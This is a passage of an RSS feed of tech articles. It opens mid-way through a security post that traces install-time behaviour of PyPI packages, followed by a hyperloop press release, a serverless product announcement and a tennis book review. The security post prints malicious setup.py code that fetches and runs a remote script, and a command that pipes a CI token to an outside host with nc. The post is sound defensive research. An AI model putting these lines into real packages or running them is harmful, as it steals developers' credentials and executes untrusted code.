    <span>"output"</span><span>:</span> <span>{</span>
        <span>"dns"</span><span>:</span> <span>[],</span>         <span>//</span> <span>Any</span> <span>DNS</span> <span>requests</span> <span>made</span>
        <span>"files"</span><span>:</span> <span>[],</span>       <span>//</span> <span>All</span> <span>file</span> <span>access</span> <span>operations</span>
        <span>"connections"</span><span>:</span> <span>[],</span> <span>//</span> <span>TCP</span> <span>connections</span> <span>established</span>
        <span>"commands"</span><span>:</span> <span>[],</span>    <span>//</span> <span>Any</span> <span>commands</span> <span>executed</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>I then wrote a series of scripts to start aggregating the data, trying to get a sense of what’s benign and what’s malicious. Let’s dig into some of the results.</p>
<h3 id="network-requests">Network Requests</h3>
<p>There are a number of reasons why a package would need to make a network connection during the installation process. They might need to download legitimate binary components or other resources, they might be a form of analytics, or they may be trying to exfiltrate data or credentials from the system.</p>
<p>The results found 460 packages making network connections to 109 unique hosts. Just like the paper above mentions, quite a few of these are the result of packages sharing a dependency that makes the network connection. It’s possible to filter these out by mapping dependencies, but I haven’t done that here.</p>
<p>For more information, <a href="https://gist.github.com/jordan-wright/c8b273372368ee639dec46b08a93bce1">here’s</a> a breakdown of DNS requests seen during installation.</p>
<h3 id="command-execution">Command Execution</h3>
<p>Like network connections, there are legitimate reasons for packages to run system commands during installation. This could be to compile native binaries, setup the right environment, and more.</p>
<p>Looking across our sample set, 60,725 packages are found to be executing commands during installation. And just like network connections, we have to keep in mind that many of these will be the result of a downstream dependency being the package that runs the commands.</p>
<h2 id="interesting-packages">Interesting Packages</h2>
<p>Digging into the results, most network connections and commands appeared to be legitimate, as expected. But there were a few instances of odd behavior I wanted to call out as case studies to show how useful this type of analysis can be.</p>
<h3 id="i-am-malicious"><code>i-am-malicious</code></h3>
<p>One package called <code>i-am-malicious</code> appears to be a proof-of-concept of a malicious package. Here are the interesting details that give us an idea that the package is worth investigating (if the name weren’t enough 😉):</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
          <span>"name"</span><span>:</span> <span>"gist.githubusercontent.com"</span><span>,</span>
          <span>"addresses"</span><span>:</span> <span>[</span>
            <span>"199.232.64.133"</span>
          <span>]</span>
    <span>}]</span>
  <span>]</span><span>,</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>...</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/tmp/malicious.py"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY|O_CLOEXEC"</span>
    <span>},</span>
    <span>...</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/tmp/malicious-was-here"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_TRUNC|O_CREAT|O_WRONLY|O_CLOEXEC"</span>
    <span>},</span>
    <span>...</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"python /tmp/malicious.py"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>We can already get some sense of what’s happening here. We see a connection made to <code>gist.github.com</code>, a Python file being executed, and a file named <code>/tmp/malicious-was-here</code> being created. Sure enough, that’s exactly what’s happening in the <code>setup.py</code>:</p>
<div><pre><code data-lang="python"><span>from</span> <span>urllib.request</span> <span>import</span> <span>urlopen</span>

<span>handler</span> <span>=</span> <span>urlopen</span><span>(</span><span>"https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"</span><span>)</span>
<span>with</span> <span>open</span><span>(</span><span>"/tmp/malicious.py"</span><span>,</span> <span>"wb"</span><span>)</span> <span>as</span> <span>fp</span><span>:</span>
    <span>fp</span><span>.</span><span>write</span><span>(</span><span>handler</span><span>.</span><span>read</span><span>())</span>

<span>import</span> <span>subprocess</span>

<span>subprocess</span><span>.</span><span>call</span><span>([</span><span>"python"</span><span>,</span> <span>"/tmp/malicious.py"</span><span>])</span></code></pre></div>
<p>The <a href="https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"><code>malicious.py</code></a> in question simply adds an “I was here” type message to <code>/tmp/malicious-was-here</code>, suggesting this is indeed a proof-of concept.</p>
<h3 id="maliciouspackage"><code>maliciouspackage</code></h3>
<p>Another self-proclaimed malicious package creatively named <code>maliciouspackage</code> is a bit more nefarious. Here’s the relevant output:</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
      <span>"name"</span><span>:</span> <span>"laforge.xyz"</span><span>,</span>
      <span>"addresses"</span><span>:</span> <span>[</span>
        <span>"34.82.112.63"</span>
      <span>]</span>
  <span>}],</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/app/.git/config"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY"</span>
    <span>},</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"sh -c apt install -y socat"</span><span>,</span>
    <span>"sh -c grep ci-token /app/.git/config | nc laforge.xyz 5566"</span><span>,</span>
    <span>"grep ci-token /app/.git/config"</span><span>,</span>
    <span>"nc laforge.xyz 5566"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>As before, our output gives us a decent idea of what’s going on. In this case, the package appears to extract out a token from the <code>.git/config</code> file and upload it to <code>laforge.xyz</code>. Looking through the <code>setup.py</code>, we see that’s exactly what’s happening:</p>
<div><pre><code data-lang="python"><span>...</span>
<span>import</span> <span>os</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'apt install -y socat'</span><span>)</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'grep ci-token /app/.git/config | nc laforge.xyz 5566'</span><span>)</span></code></pre></div>
<h3 id="easyioctl"><code>easyIoCtl</code></h3>
<p>The package <code>easyIoCtl</code> is an interesting one. It claims to give “abstractions away from boring IO operations” but we see the following commands being executed:</p>
<div><pre><code data-lang="bash"><span>[</span>
  <span>"sh -c touch /tmp/testing123"</span>,
  <span>"touch /tmp/testing123"</span>
<span>]</span></code></pre></div>
<p>Suspicious, but not actively harmful. However, this is a <em>perfect</em> example showing the power of tracing syscalls. Here is the relevant code in …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</a></em></p>]]>
            </description>
            <link>https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070672</guid>
            <pubDate>Thu, 12 Nov 2020 15:10:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First Passengers Travel Safely on a Hyperloop]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25070618">thread link</a>) | @hliyan
<br/>
November 12, 2020 | https://virginhyperloop.com/press/first-passenger-testing | <a href="https://web.archive.org/web/*/https://virginhyperloop.com/press/first-passenger-testing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

										
					<div><ul><br>
<li>Josh Giegel, CTO and Co-Founder, and Sara Luchian, Director of Passenger Experience, ride the first new form of transportation in over a century</li><br>
</ul>
<p>LAS VEGAS, NEVADA – November 8, 2020 – Transportation history was made today in the Nevada desert, where Virgin Hyperloop tested human travel in a hyperloop pod for the first time. </p>
<p>“For the past few years, the Virgin Hyperloop team has been working on turning its ground breaking technology into reality,” said <strong>Sir Richard Branson, Founder of the Virgin Group</strong>. “With today’s successful test, we have shown that this spirit of innovation will in fact change the way people everywhere live, work, and travel in the years to come.”</p>
<p>Josh Giegel, Co-Founder and Chief Technology Officer, and Sara Luchian, Director of Passenger Experience, were the first people in the world to ride on this new form of transportation. The test took place at Virgin Hyperloop’s 500 meter DevLoop test site in Las Vegas, where the company has previously run over 400 un-occupied tests. </p>
<p>“When we started in a garage over 6 years ago, the goal was simple – to transform the way people move,” said <strong>Josh Giegel, Co-Founder and Chief Technology Officer of Virgin Hyperloop</strong>. “Today, we took one giant leap toward that ultimate dream, not only for me, but for all of us who are looking towards a moonshot right here on Earth.”</p>
<p>The occupants made their maiden voyage on the newly-unveiled XP-2 vehicle, designed by BIG – <a href="https://big.dk/">Bjarke Ingels Group</a> and <a href="https://kilodesign.dk/">Kilo Design</a>, which was custom-built with occupant safety and comfort in mind. While the production vehicle will be larger and seat up to 28 passengers, this 2-seater XP-2 vehicle was built to demonstrate that passengers can in fact safely travel in a hyperloop vehicle. </p>
<p>“Hyperloop is about so much more than the technology. It’s about what it enables,” said <strong>Sara Luchian, Director of Passenger Experience for Virgin Hyperloop</strong>. “To me, the passenger experience ties it all together. And what better way to design the future than to actually experience it first-hand?”</p>
<p>Sultan Ahmed Bin Sulayem, Chairman of Virgin Hyperloop, watched this historic passenger testing first-hand. </p>
<p>“I had the true pleasure of seeing history made before my very eyes – to witness the first new mode of mass transportation in over 100 years come to life,” said <strong>Sultan Ahmed Bin Sulayem, Chairman of Virgin Hyperloop and Group Chairman and CEO of DP World</strong>. “I have always had tremendous faith in the team at Virgin Hyperloop to transform this technology into a safe system, and today we have done that. We are one step closer to ushering in a new era of ultra-fast, sustainable movement of people and goods.”</p>
<p>The testing campaign, from the beginning stages all the way through to today’s successful demonstration, was overseen by the industry-recognized Independent Safety Assessor (ISA) <a href="https://www.certifer.fr/en/homepage">Certifer</a>. Having undergone a rigorous and exhaustive safety process, the XP-2 vehicle demonstrates many of the safety-critical systems that will be found on a commercial hyperloop system and is equipped with a state-of-the-art control system that can detect off-nominal states and rapidly trigger appropriate emergency responses.</p>
<p>“I can’t tell you how often I get asked ‘is hyperloop safe?,’” said <strong>Jay Walder, CEO of Virgin Hyperloop</strong>. “With today’s passenger testing, we have successfully answered this question, demonstrating that not only can Virgin Hyperloop safely put a person in a pod in a vacuum environment, but that the company has a thoughtful approach to safety which has been validated by an independent third party.” </p>
<p>This announcement builds off of significant momentum on the regulatory front. Just last month, Virgin Hyperloop <a href="https://virginhyperloop.com/press/west-virginia-hcc">unveiled West Virginia as the location for the Hyperloop Certification Center (HCC)</a>. In July 2020, the US Department of Transportation (USDOT) Secretary Elaine Chao and the Non-Traditional and Emerging Transportation Technology (NETT) Council unveiled the <a href="https://virginhyperloop.com/press/guidance-document-regulation">guidance document</a> on a clear regulatory framework for hyperloop in the United States. This historic announcement not only provides a pathway for hyperloop regulation and deployment in the US, but also establishes hyperloop’s eligibility for federal funding for projects.</p>
<p>This federal momentum, combined with the advancements at the HCC and the historic safety demonstration achieved with this test will pave the way for the certification of hyperloop systems around the world – a key step towards commercial projects.</p><br>
<h3>Media Assets</h3>
<p>Media assets can be found <a href="https://www.dropbox.com/sh/nm689gycztpn66n/AADgE6pJQeJtXcd6225sSulDa?dl=0">here</a>. Please credit Virgin Hyperloop.</p><br>


												<h2>About Virgin Hyperloop</h2>
<p>Virgin Hyperloop is the only company in the world that has successfully tested hyperloop technology at scale, launching the first new mode of mass transportation in over 100 years. The company successfully operated a full-scale hyperloop vehicle using electric propulsion and electromagnetic levitation under near-vacuum conditions, realizing a fundamentally new form of transportation that is faster, safer, cheaper, and more sustainable than existing modes. The company is now working with governments, partners, and investors around the world to make hyperloop a reality in years, not decades. Learn more about Virgin Hyperloop's technology, vision, and ongoing projects <a href="https://virginhyperloop.com/">here</a>.</p><br>


							
							
							<h2>Media Contacts</h2>
<p><strong>Virgin Hyperloop</strong> <br>
Ryan Kelly <br>
Vice President of Marketing and Communications <br>
press@virginhyperloop.com<br>
+1 (610) 442-1896</p><br>


							
													
					</div>
				</div></div>]]>
            </description>
            <link>https://virginhyperloop.com/press/first-passenger-testing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070618</guid>
            <pubDate>Thu, 12 Nov 2020 15:06:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced CLI for CouchDB Server]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25070521">thread link</a>) | @johnjackjames
<br/>
November 12, 2020 | https://pscouchdb.readthedocs.io/en/latest/ | <a href="https://web.archive.org/web/*/https://pscouchdb.readthedocs.io/en/latest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Note</p>
<p>If you are using CouchDB version 2, use the PSCouchDB 1.X version; if instead you are using CouchDB version 3 or 4, use the PSCouchDB version 2.X</p>
</div></div>]]>
            </description>
            <link>https://pscouchdb.readthedocs.io/en/latest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070521</guid>
            <pubDate>Thu, 12 Nov 2020 14:57:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Koyeb Serverless Engine: Docker Containers, Continuous Deployment of Functions]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25070416">thread link</a>) | @edouardb
<br/>
November 12, 2020 | http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions | <a href="https://web.archive.org/web/*/http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>In July, we announced the early access of the Koyeb platform to help developers and businesses run serverless data-processing apps in minutes. Since then, we have received a lot of feedback and have been at work improving the product.</p><p>Today, we are proud to announce the public availability of the <strong>Koyeb Serverless Engine</strong> with our latest features to <strong>deploy your own code</strong>. In addition to the ready-to-use integrations, you can now seamlessly deploy <strong><a href="#native-support-of-docker-containers">Docker Containers</a></strong> and <strong><a href="#continuous-deployment-of-python-and-nodejs-functions-using-git">Code Functions with built-in Continuous Deployment using Git</a>.</strong></p><p>This release brings the power of the Koyeb Serverless Engine to all developers and businesses with <strong><a href="#event-driven-processing">event-driven processing</a>, <a href="#serverless-autoscaling-and-high-availability">native autoscaling</a>,</strong> and <strong>a complete secret management engine.</strong> The Koyeb platform provides strong primitives for data-processing with our <strong><a href="#object-storage-api-and-data-processing">Universal S3-Compliant Object Storage API</a></strong> and <strong>ready-to-use integrations</strong>. We're also happy to share that <strong><a href="#new-open-source-catalog">our catalog is now open-source</a></strong>.</p><p>The Koyeb platform offers an efficient solution to deploy your serverless applications. It is the best platform to <strong>deploy short and long-running background processing tasks with no time limit for the execution of your jobs</strong>. Common use-cases are:</p><ul><li><em>Media processing</em>: transforming images, videos, audio recordings or PDFs directly at upload</li><li><em>Web scraping and headless browser requests</em>: fetching data from and interacting with websites which do not have any API</li><li><em>Interfacing with slow or asynchronous APIs</em>: calling slow APIs or APIs using callbacks</li><li><em>Asynchronous Computer Vision and Inference</em>: automatic content detection in photos and videos for indexing, metadata enrichment or advanced anlysis</li><li><em>Batch processing</em>: running heavy computations on batches of database records or media</li><li><em>Data science and report generation</em>: analysing data and generating pre-computed reports</li><li><em>Notification reception and processing from IoT devices</em>: reacting to events generated by devices and triggering actions</li><li><em>DevOps</em>: backup, monitoring, build and deployment jobs</li><li>And much more!</li></ul><p><strong>We're happy to provide 1000 hours of compute, 1TB of storage, and 5TB of bandwidth per month for free until the end of the year.</strong>  All the function executions are currently powered by <strong>1GB of RAM and 1 vCPU</strong>. <a target="_blank" rel="noopener" href="https://app.koyeb.com/auth/signup"><strong>Sign up now</strong></a> and start deploying serverless functions!</p><p>One of the recurring requests we got was the ability to <strong>deploy your own code on Koyeb</strong>. We get it: you need to be able to inject your business logic and pair it with our ready-to-use integrations to build your application faster and better.</p><p>When looking for an efficient way to let you manage your stack functions and modifications, we decided to go with the best-practice for code and infrastructure management: <strong>version everything</strong>. We're glad to share that this new release brings a <strong>native integration with git and GitHub</strong> to seamlessly integrate Koyeb with your development workflows.</p><p>Integrating Koyeb in your development environment is a two-step process:</p><ol start="1"><li>Add a <span><code><span>koyeb.yaml</span></code></span> file in your repository describing your stack configuration. Stacks can now be deployed with a simple YAML syntax which should look familiar.
For instance, to deploy a Python 3.8 function with the <span><code><span>handler</span></code></span> entrypoint in the <span><code><span>hello_world</span></code></span> package, your <span><code><span>koyeb.yaml</span></code></span> will look like:</li></ol><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: hello-world
<span>3</span>    runtime: python3.8
<span>4</span>    handler: hello_world.handler
</code></pre><p>Fork our <a target="_blank" rel="noopener" href="https://github.com/koyeb-community/hello-world-python">Hello World in Python on GitHub</a> to see a simple example in action. You can deploy Python and Node.js functions with the same syntax.</p><ol start="2"><li>Connect your GitHub repository to Koyeb.</li></ol><p>Now each time you <span><code><span>git push</span></code></span>, we will build and deploy your code!</p><p>For Python and Node.js functions, we take care of the complete build process using standard dependency management tools. If you want to read more about deploying code functions, check our <a target="_blank" rel="noopener" href="http://koyeb.com/docs/stacks/quickstart/deploy-python-function">Python function</a> and <a target="_blank" rel="noopener" href="http://koyeb.com/docs/stacks/quickstart/deploy-nodejs-function">Node.js function</a> documentation.</p><p>After looking into the serverless space, we found that serverless solutions were fragmented into two separate generations of products to solve the same problem: containers and code functions. Our research shows that a lot of developers and companies try to use code functions but end up migrating to a container service due to runtime limitations.</p><p>We want you to be able to process your data with the technology you know and love, so we decided to provide <strong>a unified solution to deploy your applications</strong>.</p><p><strong>Containers can be deployed with the same simple YAML syntax as functions.</strong>
For instance, to deploy the <span><code><span>koyeb/cowsay</span></code></span> container from the Docker Hub, you simply need three lines of configuration:</p><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: hello-koyeb
<span>3</span>    image: koyeb/cowsay
</code></pre><p>The Koyeb Stacks work in a unified way for containers and code functions. The deployment of containers also integrates with git and lets you benefit from native versioning.</p><p>The Koyeb Serverless Engine is completely event-driven, allowing seamless integration with various sources and native autoscaling. The platform not only provides strong integration with events coming from our Object Storage gateway, it also lets you invoke your functions using events respecting the <a target="_blank" rel="noopener" href="https://cloudevents.io/">CloudEvent specification</a>.</p><p>The event system is designed to be powerful with <strong>easy filtering of incoming events using the Common Expression Language</strong>. Here is a simple example, triggering a container dumping the incoming event with <span><code><span>jq</span></code></span> each time an event is received on the Koyeb Object Storage gateway:</p><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: display-koyeb-event
<span>3</span>    image: stedolan/jq
<span>4</span>    args: [".", "/koyeb/events/in/raw"]
<span>5</span>    events:
<span>6</span>      - cloudevent:
<span>7</span>          expression: event.source == "koyeb.com/gateway"
</code></pre><p>One of the most challenging parts of serverless technologies is troubleshooting. We decided to provide <strong>essential observability features and event tracing as part of the core platform</strong>. All stacks have an audit log with all the events received and which function they triggered. The event content is highly accessible, so you can easily understand your functions' executions and failures.</p><p>As events are the foundation of our connected world, we're exploring use-cases in the IoT space. If you want to talk about events or IoT, please <a target="_blank" rel="noopener" href="http://koyeb.com/contact">contact us</a>!</p><p><a target="_blank" rel="noopener" href="https://www.koyeb.com/docs/stacks/quickstart/bind-store-events">Read more about events in our documentation</a>.</p><p>As part of the Koyeb Platform, we provide an S3-Compliant Object Storage API to store your data. You can use a Koyeb Managed Store or connect your own account cloud service provider. We're happy to share that we already support major cloud service providers including <strong>GCP Storage and AWS S3</strong>.</p><p>We also have an impressive list of cloud service providers in preview: <strong>Azure Blob, Wasabi Storage, Backblaze B2, DigitalOcean Spaces, StackPath Object Storage, and Scaleway Object Storage</strong>.</p><p><strong>Our Serverless Compute Engine is designed to seamlessly integrate with our Object Storage API</strong>. You can easily interact with your Stores from your Koyeb Stack functions and access your data with no effort.</p><p>When you do so, each function execution will get <strong>short-lived credentials</strong> in the environment to access your data store and <strong>prevent credentials leakage</strong>.</p><p>Here is an example of a function using the stores with our secret management engine to fetch the content of an object. The object to fetch and bucket location are automatically provided in the incoming event:</p><pre><code><span>1</span><span>import boto3
</span><span>2</span>import os
<span>3</span>
<span>4</span>def handler(event, context):
<span>5</span>        obj_name = event["object"]["key"]
<span>6</span>        store_name = event["bucket"]["name"]
<span>7</span>        boto_session = boto3.Session(region_name=os.environ[f"KOYEB_STORE_{store_name}_REGION"])
<span>8</span>    store_client = boto_session.resource(
<span>9</span>        "s3",
<span>10</span>        aws_access_key_id=os.environ[f"KOYEB_STORE_{store_name}_ACCESS_KEY"],
<span>11</span>        aws_secret_access_key=os.environ[f"KOYEB_STORE_{store_name}_SECRET_KEY"],
<span>12</span>        endpoint_url=os.environ[f"KOYEB_STORE_{store_name}_ENDPOINT"],
<span>13</span>    )
<span>14</span>    obj = store_client.Object(obj_key).get()
<span>15</span>    content = obj["Body"].read()
<span>16</span>    # Add your own processing logic!
</code></pre><p>Our S3-Compliant object storage API can now also be used as a <strong>standalone solution to benefit from a unified API wherever your data is stored</strong>.</p><p>One of the core benefits of the Koyeb serverless engine is that <strong>autoscaling and high-availability are provided by design</strong>.</p><p>On the availability side, you don't need to worry about dealing with failures of the underlying infrastructure, we take care of <strong>automatically provisioning your functions on a new server in case of a failure</strong>.</p><p>On the scaling side, we <strong>automatically increase the number of containers according to the number of incoming events</strong>. Free accounts have a default scaling limit at 10 to prevent abuse, <a target="_blank" rel="noopener" href="https://app.koyeb.com/support">contact us</a> if you need to scale more!</p><p>Our function catalog has been completely refreshed with <strong>ready-to-use integrations which are now completely open-source</strong>: <a target="_blank" rel="noopener" href="http://github.com/koyeb-community">github.com/koyeb-community</a>.</p><p>It's easy to combine ready-to-use functions with your own code in Stacks. For instance, to to use the <a target="_blank" rel="noopener" href="http://koyeb.com/catalog/function/image-resize">image-resize function from the catalog</a>, simply add to your <span><code><span>koyeb.yaml</span></code></span>:</p><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: image-resize
<span>3</span>    use: image-resize@1.0.0
<span>4</span>    with:
<span>5</span>      STORE: your-store
<span>6</span>      IMAGE_RESIZE_WIDTH: 150
</code></pre><p>All catalog functions can be easily forked, modified to your needs and deployed thanks to the GitHub integration.</p><p>This post extensively covers all of the platform's new features. If you want to read about complete examples, head to our new <a target="_blank" rel="noopener" href="http://koyeb.com/tutorials">tutorials section</a> where we cover complete end-to-end use-cases:</p><ul><li><a target="_blank" rel="noopener" href="https://www.koyeb.com/tutorials/image-search-app-with-koyeb-aws-rekognition-and-algolia">How to build an application with automatic labeling and indexation of medias using Koyeb, AWS Rekognition and Algolia</a></li><li><a target="_blank" rel="noopener" href="https://www.koyeb.com/tutorials/watermark-images-uploaded-to-your-backblaze-b2-bucket-automatically">How to automatically watermark images uploaded to a Backblaze B2 bucket</a></li><li><a target="_blank" rel="noopener" href="https://www.koyeb.com/tutorials/process-digitalocean-spaces-bucket-images-to-generate-thumbnail">How to process DigitalOcean Spaces images to generate thumbnails</a></li></ul><p>Some of you already spotted some of the new features under development in our documentation: cron to schedule recurring jobs, HTTP event sources, and our CLI are all under construction and scheduled for a release in the coming weeks!</p><p><strong>We're happy to provide 1000 hours of compute, 1TB of storage, and 5TB of bandwidth per month for free until the end of the year! <a target="_blank" rel="noopener" href="https://app.koyeb.com/auth/signup">Sign up now</a> ;)</strong></p><p>As always, we're available through our <a target="_blank" rel="noopener" href="https://app.koyeb.com/support"><strong>support channel</strong></a>, <a target="_blank" rel="noopener" href="https://slack.koyeb.com/"><strong>Slack</strong></a> or through our integrated instant messaging system if you have a question or want to share feedback.</p><p>We'…</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions">http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions</a></em></p>]]>
            </description>
            <link>http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070416</guid>
            <pubDate>Thu, 12 Nov 2020 14:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zen and Tennis]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070242">thread link</a>) | @adamfaliq
<br/>
November 12, 2020 | https://adamfaliq.com/2020/11/12/zen-tennis/ | <a href="https://web.archive.org/web/*/https://adamfaliq.com/2020/11/12/zen-tennis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-275">
	<!-- .entry-header -->

	<div>
		
<div><figure><a href="https://www.amazon.com/gp/product/0679778314/ref=as_li_tl?ie=UTF8&amp;tag=adamfaliq-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0679778314&amp;linkId=f91ed3fc15e31ad1717ecbdfd6f6d31f"><img loading="lazy" data-attachment-id="277" data-permalink="https://adamfaliq.com/tennis/" data-orig-file="https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg" data-orig-size="323,499" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="tennis" data-image-description="" data-medium-file="https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg?w=194" data-large-file="https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg?w=323" src="https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg?w=323" alt="" width="242" height="374" srcset="https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg?w=242 242w, https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg?w=97 97w, https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg?w=194 194w, https://adamfaliq.files.wordpress.com/2020/11/tennis.jpg 323w" sizes="(max-width: 242px) 100vw, 242px"></a></figure></div>



<p>This article reviews <em><a href="https://www.amazon.com/gp/product/0679778314/ref=as_li_tl?ie=UTF8&amp;tag=adamfaliq-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0679778314&amp;linkId=f91ed3fc15e31ad1717ecbdfd6f6d31f">The Inner Game of Tennis</a></em> and outlines actionable insights from the book.</p>



<p>In <em><a href="https://www.amazon.com/gp/product/0679778314/ref=as_li_tl?ie=UTF8&amp;tag=adamfaliq-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0679778314&amp;linkId=f91ed3fc15e31ad1717ecbdfd6f6d31f">The Inner Game of Tennis</a></em>, <a href="https://theinnergame.com/">Gallwey</a> shows the methods to overcome self-doubt, nervousness and lapses of concentration that can keep a player from winning. These challenges are called the ‘inner game’. The inner game is the game that takes place in the mind of the player and is played against inner obstacles. In contrast, the outer game is played against an external opponent to overcome external obstacles to reach an external goal.</p>



<p>A player wins the inner game when he can cultivate a spontaneous performance. The player then performs with a true self-confidence – calm and not trying too hard. The player’s mind is one with the body and he can surpass his limits.</p>



<p>There are three steps to develop one’s inner game: (1) learning to let go of judgements, (2) learning to trust yourself and (3) learning to program yourself with images rather than instructing with words.</p>



<p><strong>Let Go of Judgements</strong></p>



<p>The first step is to let go of judgements. Judgement is the self-imposed sense of “goodness” or “badness” that the player ascribes to the events that happen. A judgemental person is one who assigns a negative or a positive value to an event. The person is saying that some events are good, and he likes them, or they are bad, and he hates them.</p>



<p>Self-judgements become self-fulfilling prophecies. When a person judges himself, his inner self will act accordingly. He will begin to live according to these expectations. These expectations will perpetuate in his life until his mind establish a self-identity according to these.</p>



<p>In tennis, self-judgements also lead to emotional reactions and physical tightness, trying too hard and self-condemnation.</p>



<p>A person overcomes his judgement by seeing, feeling and being aware of what is. In tennis, the player does not have to think where the ball is, he simply sees it. He feels where the ball is and is aware of its movement. The player acknowledges his strengths, weaknesses, efforts and accomplishments.</p>



<p><strong>Trusting Yourself</strong></p>



<p>The second step is trusting yourself. What does it mean to trust yourself? Trusting yourself is not positive-thinking or overconfidence, convincing yourself to hit an ace in every serve. In the inner game, trusting yourself means to let your body hits the ball. The keyword is ‘let’. The player trusts in the competence of his body and mind, allowing himself to swing the racket.</p>



<p>Similar to self-judgement, not trusting yourself causes both mental and physical interference. These interferences result in physical tightness, mental distraction and lack of concentration.</p>



<p>A player who already knows how to swing the racket should trust his body to do it. A player who does not, should learn it. As he practices, his mind stores, refines and extends this movement in his memory. The mind remembers every action and the results of every action. The player should allow the natural learning process to take place and forget about the stroke-by-stroke instruction, similar to a baby learning how to walk.</p>



<p><strong>Using Imagery</strong></p>



<p>The last step is to program your mind using imagery, rather than words. Imagery is the mind’s native language. Using sensory images, you can hold the desired outcome that you want to achieve and let your body does the work.</p>



<p>To use the imagery technique, hold your desired results or form in your mind and allow the body to do what is necessary. The player must trust his body, refraining from giving itself instruction and from exerting controlled effort. The author stresses that it is important not to make any conscious effort when performing the action.</p>



<p><em><a href="https://www.amazon.com/gp/product/0679778314/ref=as_li_tl?ie=UTF8&amp;tag=adamfaliq-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0679778314&amp;linkId=f91ed3fc15e31ad1717ecbdfd6f6d31f">The Inner Game of Tennis</a></em> demonstrates than winning in sports and life have both inner and outer game aspects. Overcoming the inner obstacles will allow a player to improve his skills continuously. However, this does not mean that the player should not practice his outer game. The book also dedicates a section to practice and perfect a player’s tennis technique.</p>



<p>Nonetheless, knowing these techniques is only the first step in winning any game. Only constant practise and hard work will help us to overcome any obstacle that life throws at us.</p>



